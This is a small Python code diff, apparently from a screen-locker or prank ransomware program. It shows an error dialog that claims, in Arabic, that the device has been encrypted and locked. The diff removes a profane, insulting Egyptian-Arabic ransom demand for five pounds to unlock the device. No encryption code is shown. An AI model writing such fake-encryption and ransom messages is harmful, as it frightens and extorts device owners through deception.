@@ -19,8 +19,7 @@ def button():
         clos()
     else:
         winsound.Beep(1000 , 2000)
-        messagebox.showerror("تم تشفير وقفل الجهاز" , """  fuck you 🖕 
-                            ابعت ال 5ج الي عليك يروح امك عشان افتحلك الجهاز""" )
+        messagebox.showerror("تم تشفير وقفل الجهاز"  )
 
 
 
